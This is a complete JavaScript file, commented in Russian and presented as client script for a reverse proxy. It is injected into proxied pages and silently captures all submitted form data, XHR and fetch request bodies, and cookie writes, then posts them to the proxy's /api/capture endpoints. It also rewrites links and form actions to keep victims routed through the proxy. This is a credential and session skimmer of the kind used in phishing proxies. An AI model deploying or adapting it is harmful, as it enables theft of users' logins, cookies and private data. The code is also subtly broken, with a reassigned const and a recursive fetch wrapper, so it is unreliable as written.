/**
 * Клиентский JavaScript для Reverse Proxy
 */
(function() {
    // Функция для перехвата отправки форм
    function interceptForms() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            
            // Проверяем, нужно ли перехватывать форму
            if (form.getAttribute('data-proxy-ignore') === 'true') {
                return;
            }
            
            // Получаем данные формы
            const formData = new FormData(form);
            const data = {};
            
            for (const [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            // Отправляем данные на наш сервер
            fetch('/api/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    url: window.location.href,
                    formAction: form.action,
                    formMethod: form.method,
                    data: data
                })
            }).catch(error => {
                console.error('Ошибка при отправке данных формы:', error);
            });
        }, true);
    }
    
    // Функция для перехвата XHR и fetch запросов
    function interceptXhrAndFetch() {
        // Перехват XMLHttpRequest
        const originalXhrOpen = XMLHttpRequest.prototype.open;
        const originalXhrSend = XMLHttpRequest.prototype.send;
        
        XMLHttpRequest.prototype.open = function(method, url) {
            this._proxyUrl = url;
            this._proxyMethod = method;
            return originalXhrOpen.apply(this, arguments);
        };
        
        XMLHttpRequest.prototype.send = function(body) {
            const xhr = this;
            
            // Отправляем информацию о запросе на наш сервер
            fetch('/api/capture/xhr', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    url: xhr._proxyUrl,
                    method: xhr._proxyMethod,
                    data: body
                })
            }).catch(error => {
                console.error('Ошибка при отправке данных XHR:', error);
            });
            
            return originalXhrSend.apply(this, arguments);
        };
        
        // Перехват fetch
        const originalFetch = window.fetch;
        
        window.fetch = function(resource, init) {
            // Отправляем информацию о запросе на наш сервер
            fetch('/api/capture/fetch', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    url: typeof resource === 'string' ? resource : resource.url,
                    method: init && init.method ? init.method : 'GET',
                    data: init && init.body ? init.body : null
                })
            }).catch(error => {
                console.error('Ошибка при отправке данных fetch:', error);
            });
            
            return originalFetch.apply(this, arguments);
        };
    }
    
    // Функция для перехвата cookies
    function interceptCookies() {
        const originalCookie = document.cookie;
        
        Object.defineProperty(document, 'cookie', {
            get: function() {
                return originalCookie;
            },
            set: function(value) {
                originalCookie = value;
                
                // Отправляем cookie на наш сервер
                fetch('/api/capture/cookie', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        url: window.location.href,
                        cookie: value
                    })
                }).catch(error => {
                    console.error('Ошибка при отправке cookie:', error);
                });
            }
        });
    }
    
    // Функция для модификации ссылок
    function modifyLinks() {
        // Модифицируем все ссылки на странице
        document.querySelectorAll('a').forEach(function(link) {
            const href = link.getAttribute('href');
            
            if (href && href.startsWith('http') && !href.includes('/proxy?url=')) {
                link.setAttribute('href', '/proxy?url=' + encodeURIComponent(href));
            }
        });
    }
    
    // Функция для модификации форм
    function modifyForms() {
        // Модифицируем все формы на странице
        document.querySelectorAll('form').forEach(function(form) {
            const action = form.getAttribute('action');
            
            if (action && action.startsWith('http') && !action.includes('/proxy?url=')) {
                form.setAttribute('action', '/proxy?url=' + encodeURIComponent(action));
            }
            
            // Добавляем скрытое поле для отслеживания
            const hiddenField = document.createElement('input');
            hiddenField.setAttribute('type', 'hidden');
            hiddenField.setAttribute('name', '_proxy_capture');
            hiddenField.setAttribute('value', '1');
            
            form.appendChild(hiddenField);
        });
    }
    
    // Инициализация
    function init() {
        interceptForms();
        interceptXhrAndFetch();
        interceptCookies();
        modifyLinks();
        modifyForms();
        
        console.log('Proxy script initialized');
    }
    
    // Запускаем инициализацию после загрузки страницы
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
